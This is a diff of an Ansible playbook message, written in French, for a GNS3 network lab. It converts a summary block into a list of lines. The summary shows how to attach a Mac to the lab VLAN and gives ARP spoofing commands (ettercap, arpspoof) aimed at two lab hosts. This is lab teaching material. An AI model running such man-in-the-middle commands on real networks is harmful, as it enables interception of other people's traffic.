@@ -164,50 +164,50 @@
     # =========================================================================
     # Résumé
     # =========================================================================
-    - name: Résumé
+    - name: Resume
       debug:
-        msg: |
-          ========================================
-          MAC CONNECTÉ AU LAB GNS3
-          ========================================
-
-          Cloud node: MAC-Cloud
-          Connecté à: SW1 (Ethernet1/0) - VLAN 10
-
-          CONFIGURATION DU MAC:
-          ========================================
-
-          1. La route a été ajoutée (ou existait déjà):
-             route vers 192.168.10.0/24 via {{ gns3_gateway }}
-
-          2. Configure une IP sur ton Mac dans le réseau 192.168.10.x:
-
-             # Créer une interface alias (temporaire)
-             sudo ifconfig utun6 alias 192.168.10.200 255.255.255.0
-
-             # Ou plus simple, juste utiliser l'IP existante
-             # et laisser le routage faire le travail
-
-          3. Teste la connectivité:
-             ping 192.168.10.10   # ALICE
-             ping 192.168.10.20   # BOB
-             ping 192.168.10.254  # Gateway (SW2)
-
-          OUTILS D'ATTAQUE (sur ton Mac):
-          ========================================
-
-          # Installer les outils (si pas déjà fait)
-          brew install ettercap
-          brew install bettercap
-          pip3 install scapy
-
-          # ARP Spoofing avec ettercap
-          sudo ettercap -T -M arp:remote /192.168.10.10// /192.168.10.20//
-
-          # ARP Spoofing avec arpspoof (nécessite dsniff)
-          sudo arpspoof -i utun6 -t 192.168.10.10 -r 192.168.10.20
-
-          # Voir la table ARP
-          arp -a
-
-          ========================================
+        msg:
+          - "========================================"
+          - "MAC CONNECTE AU LAB GNS3"
+          - "========================================"
+          - ""
+          - "Cloud node: MAC-Cloud"
+          - "Connecte a: SW1 (Ethernet1/0) - VLAN 10"
+          - ""
+          - "CONFIGURATION DU MAC:"
+          - "========================================"
+          - ""
+          - "1. La route a ete ajoutee (ou existait deja):"
+          - "   route vers 192.168.10.0/24 via {{ gns3_gateway }}"
+          - ""
+          - "2. Configure une IP sur ton Mac dans le reseau 192.168.10.x:"
+          - ""
+          - "   # Creer une interface alias (temporaire)"
+          - "   sudo ifconfig utun6 alias 192.168.10.200 255.255.255.0"
+          - ""
+          - "   # Ou plus simple, juste utiliser l'IP existante"
+          - "   # et laisser le routage faire le travail"
+          - ""
+          - "3. Teste la connectivite:"
+          - "   ping 192.168.10.10   # ALICE"
+          - "   ping 192.168.10.20   # BOB"
+          - "   ping 192.168.10.254  # Gateway (SW2)"
+          - ""
+          - "OUTILS D'ATTAQUE (sur ton Mac):"
+          - "========================================"
+          - ""
+          - "# Installer les outils (si pas deja fait)"
+          - "brew install ettercap"
+          - "brew install bettercap"
+          - "pip3 install scapy"
+          - ""
+          - "# ARP Spoofing avec ettercap"
+          - "sudo ettercap -T -M arp:remote /192.168.10.10// /192.168.10.20//"
+          - ""
+          - "# ARP Spoofing avec arpspoof (necessite dsniff)"
+          - "sudo arpspoof -i utun6 -t 192.168.10.10 -r 192.168.10.20"
+          - ""
+          - "# Voir la table ARP"
+          - "arp -a"
+          - ""
+          - "========================================"
